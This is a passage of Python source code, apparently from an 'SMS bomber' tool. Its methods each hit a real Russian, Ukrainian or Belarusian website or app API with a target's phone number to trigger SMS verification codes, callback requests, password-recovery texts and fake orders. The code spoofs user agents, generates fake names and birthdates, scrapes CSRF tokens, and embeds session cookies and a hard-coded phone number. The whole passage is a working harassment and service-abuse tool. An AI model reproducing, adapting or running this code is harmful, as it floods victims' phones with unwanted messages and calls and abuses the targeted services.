        requests.post(f'https://api.detmir.ru/v1/sms-codes/{self.phone_not_pluse}', headers={"x-csrf-token": "YUROc2JEQWdhRFI0TUhJ", "x-requested-with": "detmir-android", "user-agent": "ru.detmir.dmbonus/4.4.0.4347", "content-length": "0", "accept-encoding": "gzip", "cookie": "JSESSIONID\u003de3c0cc3a-facc-48b1-a3a0-c236d3a4c146; auid\u003dcd20e157-eb8a-48ea-ab6a-a21054be0969; srv_id\u003dhbs-front06-prod; dm_s\u003dL-e3c0cc3a-facc-48b1-a3a0-c236d3a4c146|Vjcd20e157-eb8a-48ea-ab6a-a21054be0969|gqhbs-front06-prod|qa2a318eb6-2565-4537-8d42-a88a207f56c9|11f00108a6-7c19-452e-8dda-aaa9080de2e8#i-f6QJTzwXZ_Gkf9EysxrQf3gOgZl4DCrMG5Fg3N4pA"})

    def apizakazakaru(self):

        requests.post('https://api.zakazaka.ru/v1/', headers={"User-Agent": "android", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}, data=f'coord=56.02573402362801,36.78194995969534&app_version=android_395&device_id=16151140943779c51dc826104748b2e40f41410314&phone={self.phone_not_pluse}&action=profile.sms')

    def autoriacom(self):
        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()
        requests.post('https://auto.ria.com/iframe-ria-login/registration/2/4', data={'name':'hjkas', 'second_name':'gbhnjkm', 'email':self.phone_not_pluse[2:],'agree':'0', 'agree':'1'}, headers=headers_copy)

    def wwwyakabooua(self):
        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()
        requests.post('https://www.yakaboo.ua/customer/ajax/checkPhone/', data={'phone':self.phone}, headers=headers_copy)

    def biuaapiv(self):

        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()

        requests.post('https://bi.ua/api/v1/accounts', data={"grand_type":"sms_code","stage":"1","login":_ru_name_(),"phone":self.phone_not_pluse}, headers=headers_copy)

    def kharkovestate(self):

        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()
        requests.post('https://kharkovestate.com/engine/login.php', data={'credit':self.phone_not_pluse, 'form_id':'user_regorlogin','submit_login':'Войти или создать'}, headers=headers_copy)
        requests.get('https://kharkovestate.com/user/regorlogin', headers=headers_copy)

    def ieltorua(self):

        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()

        requests.options('https://rieltor.ua/api/users/register-sms/', headers=headers_copy)
        requests.post('https://rieltor.ua/api/users/register-sms/', data={"phone":self.phone_not_pluse,"retry":0})

    def hh_ru(self):

        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()
        requests.post('https://vladivostok.hh.ru/analytics?event=button_click&hhtmSource=account_signup&hhtmFrom=&originalRequestId=15154287937109c315a1943a50de249b', data={'buttonName':'resend_code','isSignupPage':'true', 'login':self.phone_not_pluse}, headers=headers_copy)

    def phonetua(self):

        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()
        requests.post('https://phonet.ua/rest/public/order/sm', data={"name":_ru_name_(),"phone":self.phone}, headers=headers_copy)

    def uslugiru(self):

        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()

        requests.post('https://uslugi.tatarstan.ru/user/registration', data={'user_registration_model':'','phone_number':self.phone_not_pluse[1:], 'user_registration_model':'','registration_agreement':'1'}, headers=headers_copy)

    def pravdop(self):
        requests.post('https://pravdop.com/callback.php', data={'phone':self.phone,'name':_ru_name_(),'lang':' ','form':'%D0%97%D0%B0%D0%BA%D0%B0%D0%B7%D0%B0%D1%82%D1%8C+%D0%B7%D0%B2%D0%BE%D0%BD%D0%BE%D0%BA'})

    def planeta_tc(self):
        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()
        requests.post(f'https://planeta.tc/api/callbackOrder?phone={self.phone_not_pluse}&url=https%3A%2F%2Fplaneta.tc%2Fpayment', headers=headers_copy)

    def docservisinua(self):
        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()

        requests.post('https://docservis.in.ua/', data={'_wpcf7':'1497','_wpcf7_version':'4.5.1','_wpcf7_locale':'ru_RU','_wpcf7_unit_tag':'wpcf7-f1497-o2','_wpnonce':'fd0dfe4274','your-name':name(),'tel-613':phone_mask(self.phone_not_pluse, '+## (###) ### ## ##'),'_wpcf7_is_ajax_call':'1'}, headers=headers_copy)

    def widgetsbinotelcom(self):
        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()
        requests.post('https://widgets.binotel.com/getcall/call/', data={'widgetID':'27501','externalNumber':'0675433433','scheduledCall':'1','addingDays':'1','scheduledAtHour':'9','scheduledAtMinutes':'0','sessionId':'a9df8gddg6e60435214b49fdc93661a99f68a778fb730c9807893890436b98acc28ce98b64f4dce4vghlv0643bec5fa60c7'}, headers=headers_copy)

    def mylugacomcom(self):
        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()

        requests.post('https://my.lugacom.com/api/v1/auth/subscriber/sms/send', data={"msisdn":self.phone_not_pluse[2:]}, headers=headers_copy)

    def freefoodcomua(self):
        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()

        requests.post('https://freefood.com.ua/wp-json/contact-form-7/v1/contact-forms/1119/feedback', headers=headers_copy)

    def call2friends(self):
        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()

        requests.post("https://call2friends.com/call-my-phone/web/request-free-call",
            params={"phone": self.phone_mask, "domain": "CALL2FRIENDS", "browser": "undefined"}, headers=headers_copy)

    def mybankby(self):
        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()

        requests.get('https://mybank.by/api/v1/user/isAuthenticated', headers=headers_copy)
        requests.post('https://mybank.by/api/v1/login/userIdentityByPhone', data={"phoneNumber":phone_mask(self.phone_not_pluse, '+#(###)###-##-##'),"loginWay":"1"}, headers=headers_copy)
        requests.post('https://mybank.by/api/v1/login/passwordRecovery', data={"step":"SMS"}, headers=headers_copy)


    def qlean_two(self):
        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()

        requests.post('https://qlean.ru/widget-form/http/requestotp', data={"phone":"+# (###) ###-##-##"}, headers=headers_copy)

    def taxi7788(self):
        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()
        headers_copy['Content-Type'] = 'application/x-www-form-urlencoded; charset=UTF-8'
        headers_copy['x-phone'] = self.phone_not_pluse

        requests.post('https://7788.by/api/v1/order/new', data={'customer':name(), 'lat':'53.8895340522274','lon':'28.033872178516845','misto':'Minsk', 'street':'Minsk+National+Airport','building':'Minsk+National+Airport','dstlat':'53.8895340522274','dstlon':'28.033872178516845', 'dstmisto':'Minsk','dststreet':'Minsk+National+Airport','dstbuilding':'Minsk+National+Airport','comments':' ','car_type':'G'}, headers=headers_copy)

    def ibpsbankru(self):
        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()

        requests.post('https://ib.psbank.ru/api/authentication/token', data={'grant_type':'passwordless','loginType':'Login','clientIdentifier':self.phone_not_pluse}, headers=headers_copy)

    def wwwvprokru(self):
        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()

        req=requests.get('https://www.vprok.ru/', headers={'User-Agent':user_agent()})
        headers_copy['X-CSRF-TOKEN'] = bs(req.content, 'html.parser').select('meta[name=csrf-token]')[0]['content']

        requests.post('https://www.vprok.ru/as_send_pin', data={'phone':self.phone_not_pluse}, headers=headers_copy)

    def authorization_front_api(self):
        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()

        requests.options('https://authorization-front-api.vsegda-da.com/omay-authorization-front-api/v1/partners/register', headers=headers_copy)
        requests.post('https://authorization-front-api.vsegda-da.com/omay-authorization-front-api/v1/partners/register', data={"mobilePhone":self.phone_not_pluse[1:],"consent":'true'})

    def apimarkethomecredit(self):
        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()

        requests.options('https://api.market.homecredit.ru/client/auth/', headers=headers_copy)
        requests.post('https://api.market.homecredit.ru/client/auth/', data={"phone":self.phone_not_pluse[1:],"birthday":f"19{random.choice([7,8,9])}{random.choice([1,2,3,4,5,6,7,8,9])}-{random.choice([1,2,3,4,5,6,7,8,9,10,11,12])}-{random.choice([1,2,3,4,5,6,7,8,9])}"})

    def onlinehomecreditru(self):
        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()

        requests.post('https://online.homecredit.ru/web/api/Account/V4Login/', data={"mobilePhone":self.phone_not_pluse[1:],"birthDate":f"19{random.choice([7,8,9])}{random.choice([1,2,3,4,5,6,7,8,9])}-{random.choice([1,2,3,4,5,6,7,8,9,10,11,12])}-{random.choice([1,2,3,4,5,6,7,8,9])}","captcha":'null'}, headers=headers_copy)
        requests.post('https://online.homecredit.ru/web/api/Account/V4SendSms/', headers=headers_copy)

    def mvideo_two_or_one(self):
        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()

        requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp?pageName=loginByUserPhoneVerification&fromCheckout=false&fromRegisterPage=true&snLogin=&bpg=&snProviderId=', json={'phone':phone_mask(self.phone_not_pluse, '+# ### #######'),'g-recaptcha-response':' ','recaptcha':'on'}, headers=headers_copy)

    def apistartru(self):
        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()

        number = [10,11,12,13,14,15,16,17,18,19,20,21,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,45]
        requests.post(f'https://api.start.ru/auth/phone/register?apikey=e{random.choice(number)}b{random.choice(number)}b{random.choice(number)}9f{random.choice(number)}4f2b3c7b5c{random.choice(number)}{random.choice(number)}c4eb5', json={"phone":self.phone,"status_gdpr":'true'}, headers=headers_copy)

    def admineurogroshicomua(self):
        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()

        requests.options('https://admin.eurogroshi.com.ua/v1/api/rest/verifications', headers=headers_copy)
        requests.post('https://admin.eurogroshi.com.ua/v1/api/rest/verifications', data={"phone":self.phone_not_pluse,"action":"LOGIN"}, headers=headers_copy)


    def moneycasecomua(self):
        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()
        req=requests.get('https://moneycase.com.ua', headers=headers_copy)
        html_token=bs(req.content, 'html.parser')
        token=html_token.select('input[name=csrfmiddlewaretoken]')[0]['value']

        requests.post('https://moneycase.com.ua/auth/register',data={'csrfmiddlewaretoken':token, 'phone':self.phone_not_pluse}, headers=headers_copy)

    def admintopcreditua(self):
        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()

        requests.options('https://admin.topcredit.ua/api/sms/password-verification/create', headers=headers_copy)
        requests.post('https://admin.topcredit.ua/api/sms/password-verification/create', json={"phone":"380953855684"}, headers=headers_copy)

    def admin1groshivsimcom(self):
        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()

        requests.options('https://admin1.groshivsim.com/api/borrowers/validate', headers=headers_copy)
        requests.post('https://admin1.groshivsim.com/api/borrowers/validate', json={"phone":self.phone}, headers=headers_copy)


    def wwwhyundai_vostokru(self):
        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()

        phone=phone_mask(self.phone_not_pluse, '#(###)-###-##-##')
        requests.get(f'https://www.hyundai-vostok.ru/api/send/CallBack?name={_ru_name_()}&tel=%2B{phone}&center=&time=', headers=headers_copy)

    def perevozimvse(self):
        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()
        requests.post('http://www.perevozimvse.ru/callback.asp', data={'fio':_ru_name_(),'phone':self.phone_not_pluse}, headers=headers_copy)

    def perifyskorozvonru(self):
        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()
        requests.post('https://perify.skorozvon.ru/verifications', json={'phone':self.phone, 'template':'registration','kind':'sms', 'metadata':'','roistat_id':'','D':'','metadata':'','metadata':'','latest_request_uri':'','D':''}, headers=headers_copy)

    def nalog(self):
        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()
        requests.post('https://lkdr.nalog.ru/api/v1/auth/challenge/sms/start', json={"phone":self.phone_not_pluse})

    def an_telecom(self):
        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()
        requests.post('https://an-telecom.ru/custom/an_telecom/gift/callback.php', data={'form%5Bradio%5D%5B%5D':'sale3','form%5Bphone%5D':self.phone_not_pluse,'submit':'true'}, headers=headers_copy)


    def baptekaru(self):
        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()
        try:
            req=requests.get('https://b-apteka.ru/lk/login', headers=headers_copy)
            requests.post('https://b-apteka.ru/lk/send_confirm_code', json={'phone': self.phone_not_pluse}, cookies=req.cookies, headers=headers_copy)
        except:
            pass

    def zaymer(self):
        headers = {
'accept': 'application/json, text/javascript, */*; q=0.01',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
'cache-control': 'no-cache',
'content-length': '28',
'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
'origin': 'https://www.zaymer.ru',
'pragma': 'no-cache',
'referer': 'https://www.zaymer.ru/cabinet/registrationprivate',
'sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"',
'sec-ch-ua-mobile': '?0',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-origin',
'user-agent': user_agent(),
'x-requested-with': 'XMLHttpRequest'}


        requests.post('https://www.zaymer.ru/ajax/sendToCustomerPassword', data={'phone': phone_mask(self.phone_not_pluse, '# (###) ###-#####'), 'code': None}, headers=headers, cookies={'pixel_user_fp': 'e56cd8cb5532176c43a7974faaa70626'})

#
